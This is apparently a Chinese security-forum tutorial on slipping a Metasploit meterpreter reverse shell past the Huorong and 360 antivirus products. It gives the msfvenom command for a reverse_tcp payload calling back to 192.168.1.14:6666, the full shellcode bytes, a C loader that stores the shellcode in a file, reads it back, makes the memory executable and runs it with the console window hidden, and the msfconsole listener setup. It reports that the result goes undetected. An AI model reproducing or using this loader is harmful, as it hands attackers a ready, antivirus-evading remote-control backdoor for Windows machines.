0x0前言
=====

通过分离shellcode和loader绕过火绒和安全卫士上线msf。  
环境:  
攻击机:kali  
受害者:win10  
编译器:visual studio2022

0x1生成shellcode
==============

先用msfvenom工具生成一串shellcode，-p参数是回连的载荷这里是32位的(注意如果是32位的载荷，需要修改编译的版本为x86)，-b参数在生成的shellcode中不带有\\x00，lhost是shellcode回连的ip，lport是回连端口。

```php
msfvenom -p windows/meterpreter/reverse_tcp -b '\x00' lhost=192.168.1.14 lport=6666 -f c
```

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-118fa119e2c36267e521a29edb81540aa326f6bf.png)

0x2代码加载shellcode
================

思路:将shellcode写入文件，执行时在读取进来，虽然在代码里有存在shellcode但是只是将它写到文件里面并没有执行它，执行的是我们从文件中读取的内容。  
代码如下:

```php
#include <stdio.h>
#include <windows.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
char buf[] =
"\xbd\xaa\x9d\x4d\x7b\xda\xc1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x59\x31\x6e\x14\x83\xc6\x04\x03\x6e\x10\x48\x68\xb1\x93\x03"
"\x93\x4a\x64\x7b\x1d\xaf\x55\xa9\x79\xbb\xc4\x7d\x09\xe9\xe4"
"\xf6\x5f\x1a\xc4\xf7\x6f\x95\x6c\x21\xfb\xab\x58\x1c\x3b\xe7"
"\xa5\x3f\xc7\xfa\xf9\x9f\xf6\x34\x0c\xde\x3f\x83\x7a\x0f\xed"
"\x9f\xd7\xdf\x45\x2b\x95\xe3\x68\xfb\x91\x5b\x13\x7e\x65\x2f"
"\xaf\x81\xb6\x44\x67\x9a\x66\xd1\x20\xba\x87\x36\x55\x73\xf3"
"\x84\x1f\xb5\x03\x7f\xab\x3e\xfa\xa9\xe5\x80\x3c\x9a\x0b\xad"
"\xbe\xe3\x2c\x4d\xb5\x1f\x4f\xf0\xce\xe4\x2d\x2e\x5a\xfa\x96"
"\xa5\xfc\xde\x27\x69\x9a\x95\x24\xc6\xe8\xf1\x28\xd9\x3d\x8a"
"\x55\x52\xc0\x5c\xdc\x20\xe7\x78\x84\xf3\x86\xd9\x60\x55\xb6"
"\x39\xcc\x0a\x12\x32\xff\x5d\x22\xbb\xff\x61\x7e\x2b\x33\xac"
"\x81\xab\x5b\xa7\xf2\x99\xc4\x13\x9d\x91\x8d\xbd\x5a\xa0\x9a"
"\x3d\xb4\x0a\xca\xc3\x35\x6a\xc2\x07\x61\x3a\x7c\xa1\x0a\xd1"
"\x7c\x4e\xdf\x4f\x77\xd8\x20\x27\x86\x16\xc9\x35\x89\x3c\x03"
"\xb0\x6f\x10\x43\x92\x3f\xd1\x33\x52\x90\xb9\x59\x5d\xcf\xda"
"\x61\xb4\x78\x70\x8e\x60\xd0\xed\x37\x29\xaa\x8c\xb8\xe4\xd6"
"\x8f\x33\x0c\x26\x41\xb4\x65\x34\xb6\xa3\x85\xc4\x47\x46\x85"
"\xae\x43\xc0\xd2\x46\x4e\x35\x14\xc9\xb1\x10\x27\x0e\x4d\xe5"
"\x11\x64\x78\x73\x1d\x12\x85\x93\x9d\xe2\xd3\xf9\x9d\x8a\x83"
"\x59\xce\xaf\xcb\x77\x63\x7c\x5e\x78\xd5\xd0\xc9\x10\xdb\x0f"
"\x3d\xbf\x24\x7a\x3d\xb8\xda\xf8\x6a\x61\xb2\x02\x2b\x91\x42"
"\x69\xab\xc1\x2a\x66\x84\xee\x9a\x87\x0f\xa7\xb2\x02\xde\x05"
"\x23\x12\xcb\xc8\xfd\x13\xf8\xd0\x0e\x69\x71\xe6\xef\x8e\x9b"
"\x83\xf0\x8e\xa3\xb5\xcd\x58\x9a\xc3\x10\x59\x99\xdc\x27\xfc"
"\x88\x76\x47\x52\xca\x52";

int main()
{

    FILE* fp1 = fopen("new.txt", "wb");
    fprintf(fp1, buf);
    fclose(fp1);

    FILE* fp = fopen("new.txt", "rb");
    fseek(fp, 0, SEEK_END);
    char* ptr = (char*)malloc(sizeof(buf));
    int size = ftell(fp);
    rewind(fp);
    memset(ptr, 0, sizeof(buf));
    fread(ptr, sizeof(buf), 1, fp); 

    char* start = (char*)malloc(sizeof(buf));
    memset(start, 0, sizeof(buf));
    memcpy(start, ptr, sizeof(buf));
    DWORD i = 0;
    VirtualProtect(start, sizeof(buf), PAGE_EXECUTE_READWRITE, &i);
    ((char(*)())start)();

}
```

0x3代码解释
=======

```php
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
```

因为我这里用的项目是控制台程序，在运行的时候会弹出来一个黑框，这行代码主要作用是不让这个黑框弹出来。

- - - - - -

这里是我们刚才生成的shellcode，其实就是一个16进制的数组，这里没有用无符号类型来定义，但是在内存中无符号和有符号的值是一样的。

```php
char buf[] =
"\xbd\xaa\x9d\x4d\x7b\xda\xc1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x59\x31\x6e\x14\x83\xc6\x04\x03\x6e\x10\x48\x68\xb1\x93\x03"
"\x93\x4a\x64\x7b\x1d\xaf\x55\xa9\x79\xbb\xc4\x7d\x09\xe9\xe4"
"\xf6\x5f\x1a\xc4\xf7\x6f\x95\x6c\x21\xfb\xab\x58\x1c\x3b\xe7"
"\xa5\x3f\xc7\xfa\xf9\x9f\xf6\x34\x0c\xde\x3f\x83\x7a\x0f\xed"
"\x9f\xd7\xdf\x45\x2b\x95\xe3\x68\xfb\x91\x5b\x13\x7e\x65\x2f"
"\xaf\x81\xb6\x44\x67\x9a\x66\xd1\x20\xba\x87\x36\x55\x73\xf3"
"\x84\x1f\xb5\x03\x7f\xab\x3e\xfa\xa9\xe5\x80\x3c\x9a\x0b\xad"
"\xbe\xe3\x2c\x4d\xb5\x1f\x4f\xf0\xce\xe4\x2d\x2e\x5a\xfa\x96"
"\xa5\xfc\xde\x27\x69\x9a\x95\x24\xc6\xe8\xf1\x28\xd9\x3d\x8a"
"\x55\x52\xc0\x5c\xdc\x20\xe7\x78\x84\xf3\x86\xd9\x60\x55\xb6"
"\x39\xcc\x0a\x12\x32\xff\x5d\x22\xbb\xff\x61\x7e\x2b\x33\xac"
"\x81\xab\x5b\xa7\xf2\x99\xc4\x13\x9d\x91\x8d\xbd\x5a\xa0\x9a"
"\x3d\xb4\x0a\xca\xc3\x35\x6a\xc2\x07\x61\x3a\x7c\xa1\x0a\xd1"
"\x7c\x4e\xdf\x4f\x77\xd8\x20\x27\x86\x16\xc9\x35\x89\x3c\x03"
"\xb0\x6f\x10\x43\x92\x3f\xd1\x33\x52\x90\xb9\x59\x5d\xcf\xda"
"\x61\xb4\x78\x70\x8e\x60\xd0\xed\x37\x29\xaa\x8c\xb8\xe4\xd6"
"\x8f\x33\x0c\x26\x41\xb4\x65\x34\xb6\xa3\x85\xc4\x47\x46\x85"
"\xae\x43\xc0\xd2\x46\x4e\x35\x14\xc9\xb1\x10\x27\x0e\x4d\xe5"
"\x11\x64\x78\x73\x1d\x12\x85\x93\x9d\xe2\xd3\xf9\x9d\x8a\x83"
"\x59\xce\xaf\xcb\x77\x63\x7c\x5e\x78\xd5\xd0\xc9\x10\xdb\x0f"
"\x3d\xbf\x24\x7a\x3d\xb8\xda\xf8\x6a\x61\xb2\x02\x2b\x91\x42"
"\x69\xab\xc1\x2a\x66\x84\xee\x9a\x87\x0f\xa7\xb2\x02\xde\x05"
"\x23\x12\xcb\xc8\xfd\x13\xf8\xd0\x0e\x69\x71\xe6\xef\x8e\x9b"
"\x83\xf0\x8e\xa3\xb5\xcd\x58\x9a\xc3\x10\x59\x99\xdc\x27\xfc"
"\x88\x76\x47\x52\xca\x52";
```

int main()是程序入口，代码从这里开始执行。

FILE\* fp1是定义一个结构体类型的指针，里面存放着与文件有关的信息，如文件句柄、位置指针及缓冲区等，fopen第一个参数是要打开的文件名，第二个参数是打开文件的模式，wb是如果不存在此文件就创建一个。

fprintf是将buf里的的内容输出到文件里，简单的说就是打开一个文件，如果不存在就创建它，把buf这个地址里的内容输出到这个文件里,输出完就关闭这个文件。

```php
    FILE* fp1 = fopen("new.txt", "wb");//打开文件，不存在就创建它
    fprintf(fp1, buf);//将shellcode输出到这个文件里
    fclose(fp1);//关闭这个文件
```

至此，把shellcode保存到文件的代码已经完成，下面来说从文件里读取shellcode。

第一行代码还是定义一个文件指针，打开我们刚才包含shellcode的文件这里模式是rb也就是可读可写。fseek是将文件流从开头移动到末尾。

```php
FILE* fp = fopen("new.txt", "rb");
fseek(fp, 0, SEEK_END);
```

定义一个char\*类型的指针。  
malloc函数是申请一块内存，只有一个参数，就是申请内存大小，这里用sizeof（buf）来计算shellcode的大小。  
简单地说就是定义一个指针指向我们用malloc申请空间的地址，ftell计算文件大小将结果返回给size。

```php
char* ptr = (char*)malloc(sizeof(buf));
int size = ftell(fp);
```

rewind函数是将我们的文件流重定位到文件开头，因为上面的fseek函数已将将流定位到文件末尾了，但是我们还需要从文件里读取shellcode，所以需要将文件流重定位到开头。

memset函数是填充数据，第一个参数是从哪里开始填充，第二个参数是用什么填充，第三个参数是填充多少字符。

fread是从文件读取数据到内存，第一个参数是读取的内容放到内存的哪里，第二个参数是放多少字节，第三个是放几次，最后一个是文件指针。

代码大概意思是把文件流重定位到文件内容的开头然后把上面malloc申请的内存空间全部用0填充，在读取文件内容放到申请的内存空间里。

```php
rewind(fp);
memset(ptr, 0, sizeof(buf));
fread(ptr, sizeof(buf), 1, fp); 
```

第一行和第二行就不多解释了，还是申请内存定义个指针指向申请的内存，然后将申请的内存空间全部用0填充。  
memcpy复制内存中的数据，第一个参数是复制到哪里，第二个参数是从哪里开始复制，第三个参数是复制多少字节。

```php
    char* start = (char*)malloc(sizeof(buf));
    memset(start, 0, sizeof(buf));
    memcpy(start, ptr, sizeof(buf));
```

第一行是定义一个变量，保存内存的原始属性，供VirtualProtect使用。  
VirtualProtect函数是修改内存的属性，第一个参数是从哪里修改，第二个是修改多少字节，第三个参数是要修改成什么属性PAGE\_EXECUTE\_READWRITE是可读可写可执行，最后一个参数,内存原始的属性保存的地址。

因为malloc申请的内存是没有执行权限的所以要修改这块内存的权限让我们的shellcode可以执行。

最后一行是一个函数指针，来执行这块内存，函数指针其实就是一个指向函数的指针，可以通过这个指针来调用我们的函数。

```php
DWORD i = 0;
VirtualProtect(start, sizeof(buf), PAGE_EXECUTE_READWRITE, &i);
((char(*)())start)();
```

0x4测试
=====

现在加载器已经写好了，我们来启动msf设置监听。

```php
msfconsole//启动msf
use exploit/multi/handler//进入监听模块
set lhost 192.168.1.14//设置本机的ip
set lport 6666//监听的端口
run//开始监听
```

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-187edcc52f5abccd8905e529bed353b996023a2f.png)  
现在我们来生成exe

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-ce3f315833b021434384f74f72f1ce03e4640d50.png)

没有报毒，执行下看看,可正常上线，这里为了方便就弹出了黑窗口。

![](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8f41a373a24fc2cee4c61185cd3dbfbceabb6957.png)

0x5总结
=====

将shellcode写入文件-&gt;从文件读取shellcode-&gt;分配内存-&gt;把shellcode复制到申请的内存里-&gt;更改内存的属性为可执行-&gt;函数指针执行shellcode。  
函数指针其实就是一个指向函数的指针，可以通过这个指针来调用我们的函数。

- - - - - -

由于作者水平有限，文章如有错误欢迎指出。